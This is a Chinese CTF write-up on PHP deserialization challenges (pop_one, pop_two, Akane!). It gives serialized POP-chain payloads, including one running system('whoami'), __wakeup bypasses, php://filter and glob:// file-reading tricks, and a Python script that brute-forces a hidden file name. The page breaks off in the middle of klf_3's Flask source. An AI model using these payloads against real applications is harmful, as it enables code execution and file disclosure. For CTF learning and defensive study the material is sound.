<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装</p>
<p>实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为：</p>
<ul>
<li>ArrayObject::unserialize</li>
<li>ArrayIterator::unserialize</li>
<li>RecursiveArrayIterator::unserialize</li>
<li>SplObjectStorage::unserialize</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">参考</a></p>
<h3 id="pop-one"><a href="#pop-one" class="headerlink" title="pop_one"></a>pop_one</h3><p>str_shuffle：随机地打乱字符串中的所有字符</p>
<p>用原生类绕过md5,and的优先级要低于&#x3D;，basename用ascii编码大于127绕过，$_SERVER是一个数组，可以自己打印看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">useless</span>();</span><br><span class="line"><span class="variable">$tr</span>-&gt;QW=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;YXX=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$tr</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$oa</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF</span></span><br></pre></td></tr></table></figure>

<p>最终得到一段加密的数据，太长了我就不贴了，将数据base64解密保存成图片,得到key和hername</p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/">cyberchef</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/download.jpg"></p>
<h3 id="pop-two"><a href="#pop-two" class="headerlink" title="pop_two"></a>pop_two</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$seeyou</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Me</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">her</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwe = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">important</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">useless</span>(<span class="string">&#x27;deadbeef&#x27;</span>);</span><br><span class="line"><span class="comment">// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;</span></span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">her</span>();</span><br><span class="line"><span class="variable">$cc</span>-&gt;key=<span class="number">9</span>;</span><br><span class="line"><span class="variable">$cc</span>-&gt;hername=<span class="string">&quot;momo&quot;</span>;</span><br><span class="line"><span class="variable">$method</span> = [<span class="variable">$cc</span>, <span class="string">&#x27;find&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>-&gt;seeyou= <span class="keyword">array</span>(<span class="string">&quot;seeyou&quot;</span>=&gt;<span class="variable">$method</span>) ;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>((<span class="variable">$oa</span>)));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment">#C:11:&quot;ArrayObject&quot;:345:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:&#123;s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:&#123;s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:&#123;s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:&#123;s:6:&quot;seeyou&quot;;a:1:&#123;s:6:&quot;seeyou&quot;;a:2:&#123;i:0;O:3:&quot;her&quot;:3:&#123;s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;&#125;i:1;s:4:&quot;find&quot;;&#125;&#125;s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;&#125;&#125;&#125;s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;&#125;&#125;;m:a:0:&#123;&#125;&#125; </span></span><br></pre></td></tr></table></figure>

<p>这条pop链踩了坑，第一就是，对象里只写属性值，不要再写其他的不然会有影响；</p>
<p><strong>__sleep</strong>: 该函数必须返回一个需要进行序列化保存的成员属性数组 &#x2F;&#x2F;并且只序列化该函数返回的这些成员属性</p>
<p><strong>__get</strong>: 获得一个类中不可访问的成员变量时(未定义或私有属性)</p>
<p>在PHP中，你可以使用可调用的数组来将对象的方法赋值给变量。这可以通过将对象和方法名作为数组的元素来实现。以下是一个示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$func</span> = [<span class="variable">$obj</span>, <span class="string">&#x27;myMethod&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在 $func 变量包含了 MyClass 对象的 myMethod 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用该方法</span></span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>

<p>这条链有意思，使得将<strong>her</strong>对象的<strong>find</strong>函数赋值给<strong>useless</strong>对象的<strong>seeyou</strong>变量，然后$this-&gt;good不用管，$this-&gt;good为空，会执行$good().<code>$good</code>是由important对象传过来的<code>seeyou</code>,而seeyou已经被赋值为了<strong>her</strong>对象的<strong>find</strong>函数，就会去执行find函数，</p>
<p>再用data协议绕过，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain;base64,bG92ZXlvdQ==</span><br></pre></td></tr></table></figure>

<p>再用原生类绕过，这道题用了两次php原生类。</p>
<p><code>GlobIterator</code>得到flag的文件名和路径.SplFileObject读文件，只能读取文件的第一行内容，配合<code>php://filter</code>拿到文件所有内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET :fun=./f*</span><br><span class="line">POST: ctf=GlobIterator</span><br><span class="line">#flag_my_baby.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.php</span><br><span class="line">POST :ctf=SplFileObject</span><br></pre></td></tr></table></figure>



<h2 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h2><h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hoshino</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Ruby</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Aquamarine</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Ruby-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Idol</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Akane</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Akane = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Kana</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$this</span>-&gt;Akane));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Kana</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Kurokawa Akane&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Arima Kana&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tuizi&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>考的序列化，pop链也足够明显 :,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hoshino(__destruct) -&gt; Idol(__call)</span><br></pre></td></tr></table></figure>

<p>但是没有找到任何可以命令执行的地方，然后我就去dirsearch ，也没有任何东西；</p>
<p>再仔细分析源码，pop链肯定是固定的这一点不用想，分析分析<code>__call</code>到底在干什么？ </p>
<ol>
<li><code>scandir</code>列出  $this-&gt;Akane 目录中的文件和目录,返回的是一个数组</li>
<li><code>count</code> 返回数组中元素的数目</li>
<li>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</li>
</ol>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test002.php?file=glob://f*</span><br><span class="line"></span><br><span class="line">#输出如下：</span><br><span class="line">2</span><br><span class="line">array(2) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; &#125;</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base_url =<span class="string">&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="comment"># 将字符串编码为 bytes 对象</span></span><br><span class="line">    string_bytes = string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用 base64 模块进行编码</span></span><br><span class="line">    encoded_bytes = base64.b64encode(string_bytes)</span><br><span class="line">    <span class="comment"># 将编码后的 bytes 对象转换为字符串</span></span><br><span class="line">    encoded_string = encoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encoded_string</span><br><span class="line"></span><br><span class="line">zifu = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    k = i+<span class="number">30</span></span><br><span class="line">    data = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;k&#125;</span>:&quot;glob:///var/www/html/The*.php&quot;;&#125;&#125;s:19:&quot;HoshinoAquamarine&quot;;N;&#125;&#125;&#x27;</span></span><br><span class="line">    zz = <span class="string">&quot;glob:///var/www/html/The&quot;</span> +zifu +<span class="string">&quot;*.php&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(zz) != k-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">        insert_string = zifu+<span class="built_in">str</span>[j]</span><br><span class="line">        <span class="built_in">print</span>(zifu)</span><br><span class="line">        start_index = data.find(<span class="string">&quot;The&quot;</span>+zifu)</span><br><span class="line">        insert_index = data.find(<span class="string">&quot;*.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> insert_index != -<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 在找到的位置之前插入字符串</span></span><br><span class="line">            modified_string = data[:insert_index] + insert_string + data[insert_index:]</span><br><span class="line">            base_data = base64_encode(modified_string)</span><br><span class="line">            url= base_url+base_data</span><br><span class="line">            res = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(res.text) ==<span class="number">4120</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                zifu=zifu +<span class="built_in">str</span>[j]</span><br><span class="line">                <span class="built_in">print</span>(zifu)</span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到插入位置&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符:&quot;</span>+zifu)</span><br><span class="line"></span><br><span class="line"><span class="comment">#字符:S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure>

<p>访问TheS4crEtF1AgFi1EByo2takuXX.php得到flag</p>
<h2 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h2><h3 id="source-code-1"><a href="#source-code-1" class="headerlink" title="source code"></a>source code</h3><p>再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secr3ttt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span 